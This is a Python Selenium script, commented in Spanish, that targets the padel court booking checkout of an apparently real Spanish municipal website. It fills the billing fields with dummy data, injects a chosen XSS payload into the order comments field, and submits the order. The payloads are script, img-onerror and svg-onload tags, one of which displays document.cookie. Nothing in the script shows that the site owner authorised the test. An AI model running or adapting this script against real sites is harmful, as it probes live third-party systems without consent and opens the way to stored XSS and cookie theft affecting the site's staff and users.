from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

def configurar_driver():
    """Configura Chrome de forma simple y confiable"""
    chrome_options = Options()
    chrome_options.add_argument("--disable-web-security")
    chrome_options.add_argument("--allow-running-insecure-content")
    chrome_options.add_argument("--window-size=1280,720")
    
    driver = webdriver.Chrome(options=chrome_options)
    return driver

def main():
    print("=== PRUEBA XSS SIMPLIFICADA ===")
    
    driver = configurar_driver()
    
    try:
        print("1. Abriendo pagina de reservas...")
        driver.get("https://www.horcajodesantiago.es/reserva-pistas/pista-de-padel/")
        time.sleep(3)
        
        print("Titulo:", driver.title)
        print("\nEn el navegador:")
        print("- Selecciona una fecha en el calendario")
        print("- Selecciona un horario")  
        print("- Haz clic en 'Reservar ahora'")
        print("- Ve al carrito y finaliza compra")
        
        input("\nCuando estes en la pagina de 'Finalizar compra', presiona Enter...")
        
        # Verifica que estemos en la pagina correcta
        url_actual = driver.current_url
        print(f"URL actual: {url_actual}")
        
        if "finalizar-compra" not in url_actual:
            print("Navegando a finalizar compra...")
            driver.get("https://www.horcajodesantiago.es/reserva-pistas/carrito/finalizar-compra/")
            time.sleep(3)
        
        print("2. Buscando formulario...")
        wait = WebDriverWait(driver, 10)
        
        # Busca el campo de notas especificamente
        try:
            campo_notas = wait.until(EC.presence_of_element_located((By.NAME, "order_comments")))
            print("Campo de notas encontrado!")
            
            # Rellena solo los campos basicos
            print("3. Rellenando campos basicos...")
            
            nombre = driver.find_element(By.NAME, "billing_first_name")
            nombre.clear()
            nombre.send_keys("Test")
            
            apellido = driver.find_element(By.NAME, "billing_last_name") 
            apellido.clear()
            apellido.send_keys("XSS")
            
            telefono = driver.find_element(By.NAME, "billing_phone")
            telefono.clear()
            telefono.send_keys("123456789")
            
            email = driver.find_element(By.NAME, "billing_email")
            email.clear()
            email.send_keys("test@example.com")
            
            print("4. Inyectando payload XSS...")
            
            # Limpia el campo de notas primero
            campo_notas.clear()
            
            # Payloads simples para probar
            payloads = [
                "<script>alert('XSS Basico')</script>",
                "<script>alert('Cookies: ' + document.cookie)</script>",
                "<img src=x onerror=alert('XSS via IMG')>",
                "<svg onload=alert('XSS via SVG')>"
            ]
            
            print("\nSelecciona el payload:")
            for i, payload in enumerate(payloads, 1):
                print(f"{i}. {payload}")
            
            try:
                opcion = int(input("Elige (1-4): ")) - 1
                payload_elegido = payloads[opcion]
            except:
                payload_elegido = payloads[0]  # Por defecto el primero
            
            campo_notas.send_keys(payload_elegido)
            print(f"Payload inyectado: {payload_elegido}")
            
            # Marca terminos si existe
            try:
                terminos = driver.find_element(By.NAME, "terms")
                if not terminos.is_selected():
                    terminos.click()
                    print("Terminos marcados")
            except:
                print("No se encontro casilla de terminos")
            
            print("5. Formulario listo para enviar")
            input("Presiona Enter para enviar el formulario...")
            
            # Envia el formulario
            try:
                boton_enviar = driver.find_element(By.ID, "place_order")
                boton_enviar.click()
                print("Formulario enviado!")
                
                print("\nObservando resultados...")
                print("Si aparece una alerta, la web ES VULNERABLE a XSS")
                
                time.sleep(8)
                
            except Exception as e:
                print(f"Error al enviar: {e}")
                print("Intenta enviar manualmente en el navegador")
                input("Presiona Enter cuando hayas enviado...")
            
        except Exception as e:
            print(f"Error: {e}")
            print("El formulario puede no estar disponible.")
            print("Asegurate de tener algo en el carrito primero.")
            
    except Exception as e:
        print(f"Error general: {e}")
    
    input("\nPresiona Enter para cerrar...")
    driver.quit()

if __name__ == "__main__":
    main()
